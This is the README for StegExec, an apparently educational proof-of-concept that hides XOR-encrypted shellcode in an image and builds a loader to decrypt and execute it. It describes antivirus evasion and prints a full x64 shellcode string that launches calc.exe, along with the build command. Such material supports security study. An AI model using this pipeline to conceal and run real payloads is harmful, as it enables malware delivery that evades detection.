# StegExec 🚀
                                                .       .
                                               / `.   .' \
                                       .---.  <    > <    >  .---.
                                       |    \  \ - ~ ~ - /  /    |
                                        ~-..-~             ~-..-~
                                    \~~~\.'                    `./~~~/
                         .-~~^-.    \__/                        \__/
                       .'  O    \     /               /       \  \
                      (_____,    `._.'               |         }  \/~~~/
                       `----.         /       }     |        /     \__/
                            `-.      |       /      |       /       `. ,~~|
                                ~-.__|      /_ - ~ ^|      /- _       `..-'   f: f:
                                     |     /        |     /     ~-.     `-. _||_||_
                                     |_____|        |_____|         ~ - . _ _ _ _ _>

## Overview
StegExec (Steganography Executor) is a fully automated Proof of Concept for embedding XOR-encrypted shellcode within an image file. The project encrypts the shellcode, injects it into the image, and compiles a custom C++ executable that, when launched, locates, decrypts, and executes the shellcode. This project demonstrates file steganography, memory manipulation, and antivirus evasion techniques for educational purposes. 

NOTE: I made this to learn more about steganography and antivirus evasion for my own career development. This is not intended to be used for malicious purposes.

## Features
- Automated encryption, injection, and executable compilation
- Custom C++ loader for shellcode execution on launch
- Batch-driven workflow for seamless deployment
- Demonstrates file-based stealth execution

## Getting Started

### Prerequisites
- Windows
- Python 3.x
- MinGW (includes g++ and windres)
- PowerShell

### Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/craig-rylance/StegExec.git
   cd stegexec
2. Ensure all required dependencies are installed:
- Install MinGW from [MinGW-w64](https://www.mingw-w64.org/) and ensure `g++` and `windres` are included in your installation.
3. Set up your environment:
- Place your target image file in the project directory.
- Prepare your shellcode input.

### Usage
1. Open PowerShell.
2. Run the batch script with the target image filename and shellcode as arguments:
    ```bash 
    .\compile-executable.cmd [target_image_file] "[shellcode]"
3. After successful execution, you will have a compiled `executable.exe` file that can be launched to execute the injected shellcode.


#### Example shellcode format (Launches calc.exe): 
Ensure that shellcode is formatted exactly like this, with spaces separating each byte.

    0x48 0x31 0xff 0x48 0xf7 0xe7 0x65 0x48 0x8b 0x58 0x60 0x48 0x8b 0x5b 0x18 0x48 0x8b 0x5b 0x20 0x48 0x8b 0x1b 0x48 0x8b 0x1b 0x48 0x8b 0x5b 0x20 0x49 0x89 0xd8 0x8b 0x5b 0x3c 0x4c 0x01 0xc3 0x48 0x31 0xc9 0x66 0x81 0xc1 0xff 0x88 0x48 0xc1 0xe9 0x08 0x8b 0x14 0x0b 0x4c 0x01 0xc2 0x4d 0x31 0xd2 0x44 0x8b 0x52 0x1c 0x4d 0x01 0xc2 0x4d 0x31 0xdb 0x44 0x8b 0x5a 0x20 0x4d 0x01 0xc3 0x4d 0x31 0xe4 0x44 0x8b 0x62 0x24 0x4d 0x01 0xc4 0xeb 0x32 0x5b 0x59 0x48 0x31 0xc0 0x48 0x89 0xe2 0x51 0x48 0x8b 0x0c 0x24 0x48 0x31 0xff 0x41 0x8b 0x3c 0x83 0x4c 0x01 0xc7 0x48 0x89 0xd6 0xf3 0xa6 0x74 0x05 0x48 0xff 0xc0 0xeb 0xe6 0x59 0x66 0x41 0x8b 0x04 0x44 0x41 0x8b 0x04 0x82 0x4c 0x01 0xc0 0x53 0xc3 0x48 0x31 0xc9 0x80 0xc1 0x07 0x48 0xb8 0x0f 0xa8 0x96 0x91 0xba 0x87 0x9a 0x9c 0x48 0xf7 0xd0 0x48 0xc1 0xe8 0x08 0x50 0x51 0xe8 0xb0 0xff 0xff 0xff 0x49 0x89 0xc6 0x48 0x31 0xc9 0x48 0xf7 0xe1 0x50 0x48 0xb8 0x9c 0x9e 0x93 0x9c 0xd1 0x9a 0x87 0x9a 0x48 0xf7 0xd0 0x50 0x48 0x89 0xe1 0x48 0xff 0xc2 0x48 0x83 0xec 0x20 0x41 0xff 0xd6

#### Example command:

    .\compile-executable.cmd example-image.jpg "0x48 0x31 0xff 0x48 0xf7 0xe7 0x65 0x48 0x8b 0x58 0x60 0x48 0x8b 0x5b 0x18 0x48 0x8b 0x5b 0x20 0x48 0x8b 0x1b 0x48 0x8b 0x1b 0x48 0x8b 0x5b 0x20 0x49 0x89 0xd8 0x8b 0x5b 0x3c 0x4c 0x01 0xc3 0x48 0x31 0xc9 0x66 0x81 0xc1 0xff 0x88 0x48 0xc1 0xe9 0x08 0x8b 0x14 0x0b 0x4c 0x01 0xc2 0x4d 0x31 0xd2 0x44 0x8b 0x52 0x1c 0x4d 0x01 0xc2 0x4d 0x31 0xdb 0x44 0x8b 0x5a 0x20 0x4d 0x01 0xc3 0x4d 0x31 0xe4 0x44 0x8b 0x62 0x24 0x4d 0x01 0xc4 0xeb 0x32 0x5b 0x59 0x48 0x31 0xc0 0x48 0x89 0xe2 0x51 0x48 0x8b 0x0c 0x24 0x48 0x31 0xff 0x41 0x8b 0x3c 0x83 0x4c 0x01 0xc7 0x48 0x89 0xd6 0xf3 0xa6 0x74 0x05 0x48 0xff 0xc0 0xeb 0xe6 0x59 0x66 0x41 0x8b 0x04 0x44 0x41 0x8b 0x04 0x82 0x4c 0x01 0xc0 0x53 0xc3 0x48 0x31 0xc9 0x80 0xc1 0x07 0x48 0xb8 0x0f 0xa8 0x96 0x91 0xba 0x87 0x9a 0x9c 0x48 0xf7 0xd0 0x48 0xc1 0xe8 0x08 0x50 0x51 0xe8 0xb0 0xff 0xff 0xff 0x49 0x89 0xc6 0x48 0x31 0xc9 0x48 0xf7 0xe1 0x50 0x48 0xb8 0x9c 0x9e 0x93 0x9c 0xd1 0x9a 0x87 0x9a 0x48 0xf7 0xd0 0x50 0x48 0x89 0xe1 0x48 0xff 0xc2 0x48 0x83 0xec 0x20 0x41 0xff 0xd6"

Running this command will produce an executable that will launch calc.exe using the encrypted shellcode inside of example-image.jpg

## ⚠️ Important Note
This project is for **educational and research purposes only**. Ensure compliance with all legal and ethical guidelines when testing or demonstrating the techniques presented in this project.

## Contributing
If you would like to contribute to this project, please fork the repository and submit a pull request with your enhancements or bug fixes.

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments
- Credit to leetcipher (https://github.com/leetCipher) for the base Python and C++ code. This repo improves his work to automate into a simple command line tool.